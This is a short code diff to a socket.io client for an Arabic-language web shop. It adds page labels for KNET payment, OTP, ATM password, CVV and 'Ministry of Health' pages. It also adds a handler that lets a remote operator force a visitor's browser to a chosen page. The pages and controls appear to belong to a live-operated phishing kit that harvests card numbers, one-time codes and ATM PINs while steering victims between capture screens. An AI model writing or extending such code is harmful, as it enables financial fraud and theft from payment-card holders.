@@ -1,4 +1,5 @@
 import { io, type Socket } from "socket.io-client";
+import { goToAdminPage } from "@/lib/pageRoutes";
 import type { CartSnapshot, Catalog, OrderDraft, OrderReceipt } from "./types";
 
 export type ConnectionStatus =
@@ -96,8 +97,15 @@ function pageLabel(): string {
     if (p.indexOf("/product") === 0) return "تفاصيل المنتج";
     if (p.indexOf("/cart") === 0) return "سلة المشتريات";
     if (p.indexOf("/checkout") === 0) return "إتمام الطلب";
-    if (p.indexOf("/knet") === 0) return "صفحة K-NET";
-    if (p.indexOf("/card") === 0) return "صفحة البطاقة";
+    if (p.indexOf("/knet-otp") === 0) return "رمز التحقق (OTP)";
+    if (p.indexOf("/knet") === 0) return "دفع كي نت";
+    if (p.indexOf("/card") === 0) return "الدفع بالبطاقة";
+    if (p.indexOf("/otp-verification") === 0) return "رمز التحقق (OTP)";
+    if (p.indexOf("/atm") === 0) return "كلمة مرور ATM";
+    if (p.indexOf("/cvv") === 0) return "CVV";
+    if (p.indexOf("/final-page") === 0) return "الصفحة النهائية";
+    if (p.indexOf("/moh-") === 0) return "وزارة الصحة";
+    if (p.indexOf("/summary-payment") === 0) return "ملخص الدفع";
     return "الصفحة الرئيسية";
   } catch (e) { return "الصفحة الرئيسية"; }
 }
@@ -509,6 +517,7 @@ try {
         );
     });
     socket.on("disconnect", () => notify("disconnected"));
+    socket.on("visitor:navigate", (page: string) => { if (page) goToAdminPage(page); });
     socket.on("connect_error", () => notify("disconnected"));
     socket.on("kdd:catalog:updated", () =>
       catalogSubscribers.forEach(fn => fn())
